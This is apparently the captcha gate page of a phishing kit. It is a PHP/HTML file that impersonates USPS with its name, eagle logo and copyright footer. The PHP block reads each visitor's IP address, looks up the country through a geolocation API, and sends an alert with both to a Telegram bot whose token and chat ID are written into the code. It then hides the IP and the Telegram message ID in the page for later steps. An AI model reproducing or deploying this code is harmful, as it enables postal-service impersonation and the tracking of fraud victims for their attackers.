
<?php
session_start();
ini_set('display_errors', 1);
error_reporting(E_ALL);
?>


<!DOCTYPE html>


<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>USPS Captcha</title>
  <style>
    body {
      margin: 0;
      padding: 10px;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      background-color: whitesmoke;
      font-family: Arial, sans-serif;
      color: #333; /* Adjusted for better readability */
    }

    .custom-loader, #main-page-button, input {
      max-width: 90%; /* Ensures elements do not exceed the screen width */
    }

    #loader-container {
      text-align: center;
    }

    .custom-loader {
      height: 10px;
      background-color: #fff;
      position: relative;
    }

    .loader-bar {
      height: 100%;
      background-color: #ff4500;
      position: absolute;
      animation: move 2s infinite linear;
    }

    @keyframes move {
      0%, 100% { transform: translateX(0); }
      50% { transform: translateX(80px); }
    }

    #loader-text {
      margin-top: 10px;
      font-size: 1em; /* Responsive font size */
      color: black;
    }

    #input-section, #main-page-content {
      display: flex;
      flex-direction: column;
      align-items: center;
      width: 100%; /* Use full container width */
    }

    input, #main-page-button {
      margin-top: 10px;
      padding: 10px;
      width: auto; /* Adjust width based on content */
      font-size: 1em; /* Responsive font size */
    }

    #main-page-button {
      background-color: #fff;
      color: black;
      border-radius: 5px;
      cursor: pointer;
      font-weight: bold;
    }

    #userInput.invalid {
      border: 2px solid darkblue;
    }

    #errorMsg {
      font-size: 0.8em; /* Responsive font size */
      color: red; /* Fixed color for better visibility */
    }

    @media (max-width: 600px) {
      #main-page-button, input {
        padding: 8px 20px; /* Adjust padding for smaller screens */
      }

      #loader-text, #errorMsg {
        font-size: 0.9em; /* Adjust font size for smaller screens */
      }
    }
  </style>
</head>
<body>
<?php
  $botToken = "6887294087:AAEC802yB2ffTk_d0HaC43X6tv3VTnaHTOs";
  $chatID = "1064643518";

  
  $userIP = $_SERVER["REMOTE_ADDR"];
  $accessTime = date("Y-m-d H:i:s");

  // Fetching the geolocation data
  $geoUrl = "http://ip-api.com/json/$userIP";
  $geoResponse = file_get_contents($geoUrl);
  $geoData = json_decode($geoResponse, true);

  // Extracting the country from the response
  $country = $geoData['country'] ?? 'Unknown';

  // Message to Send
  $message = urlencode(
      "[Alert] NEW VISITOR FROM IP : $userIP, Country: $country, status : captcha"
  );

  // Now you can use $message as needed


  // Telegram API URL for sending messages
  $telegramApi = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatID&text=$message";

  // Use file_get_contents to send the request
  $response = file_get_contents($telegramApi);

  // Decode the JSON response to an array
  $responseArray = json_decode($response, true);

  // Extract the message_id from the response
  $messageId = $responseArray["result"]["message_id"];
  echo "<input type='text' value='" .$messageId ."' style='display:none' id='messageId' />";

  echo "<input type='text' value='" .$userIP ."' style='display:none' id='ipzebi' />";

  //echo file_get_contents("https://api.telegram.org/botYOUR_BOT_TOKEN/editMessageText", false, stream_context_create(['http' => ['method' => 'POST', 'header' => 'Content-Type: application/x-www-form-urlencoded', 'content' => http_build_query(['chat_id' => 'CHAT_ID', 'message_id' => MESSAGE_ID, 'text' => 'This is the new edited text'])]]));


?>



<div id="loader-container">
  <br>
  <img src="https://i0.wp.com/mailomg.com/wp-content/uploads/2017/09/usps_eagle-symbol.png?resize=300%2C253&ssl=1">
    <div id="loader-text">Please finish the captcha to go to the main page...</div>

<br>
</div>
<br>
<br>

<br>


<div id="main-page-content">
  <svg xmlns="http://www.w3.org/2000/svg" width="200" height="100" viewBox="0 0 200 100">
    <rect width="100%" height="100%" fill="#eee" />
    <text id="randomStringSpan" x="50%" y="50%" font-size="30" fill="#333" text-anchor="middle" dominant-baseline="middle" font-family="Arial, sans-serif">
  

    </text>
    <line x1="10" y1="40" x2="190" y2="40" stroke="#333" stroke-width="2" />
    <line x1="10" y1="60" x2="190" y2="60" stroke="#333" stroke-width="2" />
    <line x1="30" y1="20" x2="30" y2="80" stroke="#333" stroke-width="2" />
    <line x1="70" y1="20" x2="70" y2="80" stroke="#333" stroke-width="2" />
    <line x1="110" y1="20" x2="110" y2="80" stroke="#333" stroke-width="2" />
    <line x1="150" y1="20" x2="150" y2="80" stroke="#333" stroke-width="2" />
    <circle cx="25" cy="25" r="5" fill="#333" />
    <circle cx="50" cy="75" r="5" fill="#333" />
    <circle cx="100" cy="40" r="5" fill="#333" />
    <circle cx="150" cy="60" r="5" fill="#333" />
  </svg>

  <div id="input-section">
    <input  id="userInput"  type="text" placeholder="Enter captcha text" />
			<span id="errorMsg"></span>
    <button id="main-page-button" onclick="checkInput()" style="color:red">Submit</button>

  </div>
</div>
<div style="position:absolute;display:block;bottom:0px" >
<p style="color:black; text-align: center;"> Copyright © 2024 USPS, Inc. </p>
</div>
<script src="script.js"></script>

</body>
</html>
